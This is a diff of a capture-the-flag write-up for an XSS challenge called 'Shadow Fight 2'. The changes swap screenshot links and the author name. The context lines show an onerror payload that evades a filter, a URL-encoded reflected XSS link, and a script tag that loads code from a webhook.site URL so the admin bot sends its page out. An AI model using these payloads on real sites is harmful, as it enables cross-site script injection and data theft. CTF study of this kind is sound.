@@ -16,7 +16,7 @@ Do you know more XSS?
 
 We can see a website that serves as a kind of profile page using Lorem Picsum (a placeholder image service). When you upload your nickname and avatar, it displays the profile.
 
-<img width="950" height="770" alt="web" src="https://github.com/user-attachments/assets/2ba40b48-ae4d-42d3-a6dc-45664e6c6f4e" />
+<img width="950" height="770" alt="web" src="https://github.com/user-attachments/assets/a4a13c80-17f2-4e46-9644-f44695690d69" />
 
 We can see this gives us a URL, which converts it into a reflected XSS vulnerability. The level is quite similar to Shadow Fight 1 and gives us a similar URL:
 
@@ -30,7 +30,7 @@ Testing more thoroughly, the first thing I did was try my payload from Shadow Fi
 <video src=1 onerror=\a\l\ert\('hola\aa'\)>
 ```
 
-<img width="978" height="543" alt="xss" src="https://github.com/user-attachments/assets/51dcd866-5bba-481b-bd19-983829766820" />
+<img width="978" height="543" alt="xss" src="https://github.com/user-attachments/assets/6cc08fb9-24ef-4d56-8dc1-58bf12a55b85" />
 
 Even with this, there seemed to be a CSP (Content Security Policy) or WAF (Web Application Firewall) that didn't allow traffic to exit or use all JavaScript functions, including the bypass which also didn't fully allow JavaScript to pass through.
 
@@ -63,7 +63,7 @@ Knowing we need to work on the URL part, if we put another URL that isn't from p
 https://shadow-fight-2.ctf.prgy.in/?name=papas&avatar=https%3A%2F%2Fpicsum.photos%2Fseed%2Fpicsum%2F200%2F300%3C%2Fscript%3E%3Cvideo+src%3D1+onerror%3Dalert%281%29%3E
 ```
 
-<img width="965" height="275" alt="xss_url" src="https://github.com/user-attachments/assets/51083676-2ea8-4606-a937-3a7db8d20452" />
+<img width="965" height="275" alt="xss_url" src="https://github.com/user-attachments/assets/6b655251-7b09-407f-9030-811d466fa12d" />
 
 ---
 
@@ -90,13 +90,14 @@ To solve this challenge, you need to understand:
 
 Once the vulnerability was identified, I found that commands and payloads like fetch using character escaping (e.g., `\fe\t\ch`) failed. The page appeared to have both SOP (Same-Origin Policy) and CSP (Content Security Policy) protections. This left me to test the `src` attributes of scripts to see if I could bypass through there. I tested with my webhook, and bingo—we can see that it works and I receive the request on my webhook server.
 
-<img width="584" height="51" alt="webhook_url" src="https://github.com/user-attachments/assets/5a42386a-bc72-4b42-b080-a17f0b3b184a" />
+<img width="584" height="51" alt="webhook_url" src="https://github.com/user-attachments/assets/52fd0cc1-e812-4030-99c1-70d1ba4d4d54" />
+
 
 ```html
 </script><script src='https://webhook.site/6c7adab5-a6ec-403f-9e23-52a8b20dedc2'></script>
 ```
 
-<img width="877" height="479" alt="src_script" src="https://github.com/user-attachments/assets/381c1590-dcd6-42bf-bfdd-b6eb38e7c7d2" />
+<img width="877" height="479" alt="src_script" src="https://github.com/user-attachments/assets/f47b69a3-fd39-45ba-aeb0-a4ce6f953a75" />
 
 ### Step 2: Exploiting the Vulnerability
 
@@ -154,15 +155,15 @@ Priority: u=1, i
 
 We receive a response confirming that the admin will review it soon:
 
-<img width="2028" height="1122" alt="burp" src="https://github.com/user-attachments/assets/933f3447-5c34-4265-a85b-7c754822884b" />
+<img width="2028" height="1122" alt="burp" src="https://github.com/user-attachments/assets/8cb0fb14-fcc2-494e-8ad8-ae059d2f43ec" />
 
 And that's it! We receive the admin's HTML code and see that it makes requests to our webhook:
 
-<img width="1119" height="390" alt="webhook" src="https://github.com/user-attachments/assets/3e9cf671-b6e3-4c05-93b4-0da63e83f17e" />
+<img width="1119" height="390" alt="webhook" src="https://github.com/user-attachments/assets/f0e89ba4-75ef-4b24-badd-411bede80125" />
 
 In the POST request, we can see the following code:
 
-<img width="1210" height="405" alt="flag" src="https://github.com/user-attachments/assets/fd8ab7d1-5bdc-42c9-a46c-09d857409570" />
+<img width="1210" height="405" alt="flag" src="https://github.com/user-attachments/assets/864e2369-1292-44d8-9542-384f55e8975b" />
 
 ```html
 <script>
@@ -485,4 +486,4 @@ if __name__ == '__main__':
 
 ---
 
-> **Author:** Jose Antonio Villafaña Montes de Oca
+> **Author:** P34NUT
